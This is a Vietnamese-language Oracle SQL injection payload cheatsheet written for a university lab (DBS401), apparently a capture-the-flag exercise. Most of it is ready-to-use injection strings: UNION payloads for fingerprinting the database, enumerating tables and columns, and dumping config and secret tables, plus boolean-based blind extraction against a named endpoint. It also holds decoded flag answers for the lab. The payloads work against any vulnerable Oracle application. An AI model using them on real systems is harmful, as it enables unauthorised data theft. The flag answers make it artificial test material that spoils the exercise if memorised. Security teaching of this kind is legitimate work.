# Oracle SQL Injection Payload Cheatsheet
## DBS401 – Group 02 – Lab Reference Only

> ⚠️ Chỉ dùng trong môi trường lab DBS401. Không dùng trên hệ thống thật. (Lưu ý: Các payload Blind SQLi, IDOR và các phần flag cũ dưới đây là từ kịch bản trước, không phải lỗ hổng chính cho Flag 2 và Flag 3 trong kịch bản hiện tại.)

---

## 1. Xác nhận Oracle Database

```sql
-- Oracle dùng DUAL table (MySQL/MSSQL không có)
' AND 1=1 AND ROWNUM=1 AND '1'='1
' UNION SELECT NULL FROM DUAL WHERE '1'='1

-- Lấy Oracle version
' UNION SELECT NULL,BANNER,NULL FROM V$VERSION WHERE ROWNUM=1 AND '1'='1

-- Lấy DB user hiện tại
' UNION SELECT NULL,USER,NULL FROM DUAL WHERE '1'='1
-- hoặc:
' UNION SELECT 1,SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL WHERE '1'='1

-- Lấy DB name
' UNION SELECT 1,ORA_DATABASE_NAME,NULL FROM DUAL WHERE '1'='1
```

---

## 2. Xác định số cột (Column Count)

```sql
-- Thêm từng NULL đến khi không lỗi
' UNION SELECT NULL FROM DUAL WHERE '1'='1
' UNION SELECT NULL,NULL FROM DUAL WHERE '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1   ← ứng dụng này có 3 cột ✓
```

---

## 3. Xác định kiểu dữ liệu từng cột

```sql
-- Cột 1 là NUMBER:  thay NULL bằng số
' UNION SELECT 1,NULL,NULL FROM DUAL WHERE '1'='1

-- Cột 2 là VARCHAR2: thay bằng string
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1

-- Cột 3 là VARCHAR2
' UNION SELECT 1,'test','test2' FROM DUAL WHERE '1'='1
```

---

## 4. Enumerate Tables (Oracle Metadata)

```sql
-- Liệt kê 5 bảng đầu của user hiện tại
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1

-- Lấy bảng tiếp theo (dùng NOT IN để skip bảng đã biết)
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES
WHERE table_name NOT IN ('USERS','STUDENTS','COURSES','ENROLLMENTS','AUDIT_LOGS')
AND ROWNUM<=5 AND '1'='1

-- Liệt kê TẤT CẢ bảng (có thể cần nhiều lần)
' UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL
FROM USER_TABLES WHERE '1'='1

-- Từ ALL_TABLES (có thể cần quyền cao hơn)
' UNION SELECT 1,table_name,owner FROM ALL_TABLES WHERE ROWNUM<=5 AND '1'='1
```

---

## 5. Enumerate Columns

```sql
-- Liệt kê cột của một bảng cụ thể
' UNION SELECT 1,column_name,data_type FROM USER_TAB_COLUMNS
WHERE table_name='FLAGS' AND ROWNUM<=10 AND '1'='1

-- Liệt kê cột của ADMIN_SECRETS
' UNION SELECT 1,column_name,data_type FROM USER_TAB_COLUMNS
WHERE table_name='ADMIN_SECRETS' AND '1'='1

-- Tất cả cột của tất cả bảng (chậm)
' UNION SELECT 1,table_name||'.'||column_name,data_type
FROM USER_TAB_COLUMNS WHERE ROWNUM<=10 AND '1'='1
```

---

## 6. Extract Data từ Các Bảng

### FLAGS table
```sql
-- Lấy tất cả flag parts (is_active=1)
' UNION SELECT flag_id,flag_part,flag_code FROM FLAGS WHERE is_active=1 AND ROWNUM<=5 AND '1'='1

-- Lấy theo part_order
' UNION SELECT 1,flag_part,part_order FROM FLAGS WHERE part_order=1 AND flag_code='FL1_PART_A' AND '1'='1
```

### AUDIT_LOGS table
```sql
-- Tìm log theo action type
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS
WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1

-- Tìm log chứa fragment
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS
WHERE metadata_note LIKE '%fragment%' AND ROWNUM=1 AND '1'='1
```

### CONFIG_STORE table
```sql
-- Lấy private configs (is_public=0)
' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE WHERE is_public=0 AND ROWNUM<=5 AND '1'='1

-- Lấy config cụ thể
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='sys_alpha_marker' AND '1'='1

-- oracle_flag_3_suffix (hex encoded)
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE
WHERE config_key='oracle_flag_3_suffix' AND '1'='1
```

### SYSTEM_HINTS table
```sql
-- Xem tất cả hints
' UNION SELECT hint_id,hint_key,hint_value FROM SYSTEM_HINTS WHERE ROWNUM<=5 AND '1'='1
```

### ADMIN_SECRETS table
```sql
-- Tên key (không lấy giá trị - để tìm target cho Blind SQLi)
' UNION SELECT secret_id,secret_key,note FROM ADMIN_SECRETS WHERE is_active=1 AND '1'='1
```

---

## 7. Boolean-Based Blind SQLi (Vuln 3)

Endpoint: `GET /secret_check.php?key=VALUE`

```sql
-- Xác nhận injection
key=oracle_flag_3_primary' AND '1'='1   → found   ✓
key=oracle_flag_3_primary' AND '1'='2   → not_found ✓

-- Xác định LENGTH
key=oracle_flag_3_primary' AND LENGTH(encrypted_value)>10 AND '1'='1   → found
key=oracle_flag_3_primary' AND LENGTH(encrypted_value)=18 AND '1'='1   → found ✓

-- Extract ký tự theo vị trí (Oracle SUBSTR = 1-indexed)
key=oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,1,1))=68 AND '1'='1   → found (D)
key=oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,2,1))=66 AND '1'='1   → found (B)
key=oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,3,1))=83 AND '1'='1   → found (S)
-- ... tiếp tục đến hết 18 ký tự

-- Phân biệt REAL key vs FAKE key:
-- oracle_flag_3_primary  → char[1] = 'D' (ASCII 68)
-- oracle_flag_3_backup   → char[1] = 'F' (ASCII 70)
key=oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,1,1))=68 AND '1'='1   → found ← REAL
key=oracle_flag_3_backup'  AND ASCII(SUBSTR(encrypted_value,1,1))=68 AND '1'='1   → not_found ← FAKE
```

---

## 8. Oracle-Specific Functions (hữu ích cho CTF)

```sql
-- Nối chuỗi (Oracle dùng || thay vì CONCAT trong MySQL)
' UNION SELECT 1,'hello'||'world',NULL FROM DUAL WHERE '1'='1

-- Lấy ký tự từ ASCII code
CHR(68) = 'D'
CHR(66) = 'B'

-- Decode hex inline (dùng UTL_RAW nếu có quyền)
UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('4442533430317B'))  -- = 'DBS401{'

-- Base64 decode (Oracle 11g+)
UTL_ENCODE.BASE64_DECODE(UTL_RAW.CAST_TO_RAW('REJTNDAQ7VFM_'))

-- Thông tin hệ thống Oracle
SYS_CONTEXT('USERENV','DB_NAME')        -- tên database
SYS_CONTEXT('USERENV','SESSION_USER')   -- user hiện tại
SYS_CONTEXT('USERENV','HOST')           -- hostname
SYS_CONTEXT('USERENV','IP_ADDRESS')     -- IP client
```

---

## 9. ROWNUM vs LIMIT

```sql
-- Oracle KHÔNG có LIMIT, dùng ROWNUM trong WHERE
-- Sai (MySQL syntax):
SELECT * FROM USERS LIMIT 5

-- Đúng (Oracle):
SELECT * FROM USERS WHERE ROWNUM <= 5

-- Phân trang Oracle (12c+):
SELECT * FROM USERS FETCH FIRST 5 ROWS ONLY

-- ROWNUM phải dùng trong subquery nếu cần ORDER BY:
SELECT * FROM (
    SELECT * FROM USERS ORDER BY user_id
) WHERE ROWNUM <= 5
```

---

## 10. Decode Steps Summary (Lab Reference)

| Chuỗi thu được | Bước decode | Kết quả |
|---------------|------------|---------|
| `4442533430317B53514C5F` | hex_decode | `DBS401{SQL_` |
| `_n01tc3jn1` | reverse | `1nj3ct10n_` |
| `MHI0Y2wzIX0=` | base64_decode | `0r4cl3!}` |
| `REJTNDAxezFET1JfVHI0bnNf` | base64_decode | `DBS401{1DOR_Tr4ns_` |
| `}!w4lF_ss3cc4` | reverse | `4cc3ss_Fl4w!}` |
| `307234636C335F58337274217D` | hex_decode | `0r4cl3_X3rt!}` |

---

## 11. Tools (Lab)

```bash
# Decode hex trong terminal
echo "4442533430317B53514C5F" | xxd -r -p

# Decode base64
echo "REJTNDAxezFET1JfVHI0bnNf" | base64 -d

# Reverse string (Python)
python3 -c "print('_n01tc3jn1'[::-1])"

# Dùng decode_helper.py
python3 tools/decode_helper.py --assemble

# Chạy exploit script Vuln 3
python3 tools/exploit_flag3_local.py --host 127.0.0.1 --port 80
```

---

*DBS401 – Group 02 – Cheatsheet nội bộ – Không phát hành công khai*
